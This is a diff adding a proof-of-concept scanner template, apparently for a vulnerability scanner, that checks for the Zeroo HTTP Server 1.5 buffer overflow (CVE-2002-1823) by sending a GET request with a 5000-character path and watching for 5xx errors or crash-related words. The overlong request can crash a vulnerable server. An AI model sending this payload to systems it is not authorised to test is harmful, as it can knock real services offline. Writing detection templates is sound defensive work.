@@ -1,0 +1,42 @@
+[info]
+author = "ave"
+description = "通过发送超长 HTTP GET 请求路径检测 Zeroo HTTP Server 1.5 的 HttpGetRequest 函数缓冲区溢出漏洞。若服务器处理超长请求时发生崩溃或异常响应，则表明存在该漏洞。"
+id = "POC-AVE-2002-0698"
+name = "Lonerunner Zeroo HTTP Server 远程缓冲区溢出漏洞 PoC"
+severity = "high"
+tags = ["ave-2002-0698"]
+vuln_id = [
+    "CVE-2002-1823",
+    "AVE-2002-0698",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = '/{{BaseURL}}/{{repeat(5000, "A")}}'
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    500,
+    502,
+    503,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "error",
+    "overflow",
+    "crash",
+    "Internal Server Error",
+]
